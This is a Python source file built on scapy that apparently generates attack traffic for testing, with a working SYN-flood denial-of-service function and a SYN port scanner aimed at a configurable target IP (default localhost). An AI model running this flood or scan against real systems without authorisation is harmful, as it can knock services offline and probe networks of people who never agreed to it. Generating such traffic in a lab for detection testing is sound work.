from scapy.all import *
import time
import random
import argparse
import logging
from scapy.layers.inet import IP, TCP, UDP

class AttackSimulator:
    def __init__(self, target_ip="127.0.0.1", target_ports=None):
        self.target_ip = target_ip
        self.target_ports = target_ports or [80, 443, 8080]
        logging.basicConfig(level=logging.INFO)
        
    def simulate_dos_attack(self, duration=10, intensity=100):
        """Simulate DoS attack with SYN flood"""
        logging.info(f"Starting DoS attack simulation for {duration} seconds...")
        end_time = time.time() + duration
        
        while time.time() < end_time:
            for port in self.target_ports:
                # Create SYN flood packets
                packet = IP(dst=self.target_ip)/TCP(
                    sport=RandShort(),
                    dport=port,
                    flags="S"
                )
                try:
                    send(packet, verbose=False)
                except Exception as e:
                    logging.error(f"Error sending DoS packet: {e}")
            time.sleep(1/intensity)  # Control attack intensity
            
    def simulate_port_scan(self, scan_range=(1, 1024)):
        """Simulate port scanning attack"""
        logging.info(f"Starting port scan simulation on ports {scan_range}...")
        for port in range(scan_range[0], scan_range[1]):
            packet = IP(dst=self.target_ip)/TCP(
                sport=RandShort(),
                dport=port,
                flags="S"
            )
            try:
                send(packet, verbose=False)
            except Exception as e:
                logging.error(f"Error during port scan: {e}")
            time.sleep(0.1)  # Delay between scans

def main():
    parser = argparse.ArgumentParser(description="Network Attack Traffic Simulator")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address")
    parser.add_argument("--attack-type", choices=["dos", "portscan", "all"], 
                      default="all", help="Type of attack to simulate")
    parser.add_argument("--duration", type=int, default=30,
                      help="Duration of attack in seconds")
    parser.add_argument("--intensity", type=int, default=100,
                      help="Attack intensity (packets per second)")
    
    args = parser.parse_args()
    simulator = AttackSimulator(target_ip=args.target)
    
    try:
        if args.attack_type in ["dos", "all"]:
            simulator.simulate_dos_attack(
                duration=args.duration,
                intensity=args.intensity
            )
        
        if args.attack_type in ["portscan", "all"]:
            simulator.simulate_port_scan()
            
    except KeyboardInterrupt:
        logging.info("Attack simulation stopped by user")
    except Exception as e:
        logging.error(f"Error during attack simulation: {e}")

if __name__ == "__main__":
    main()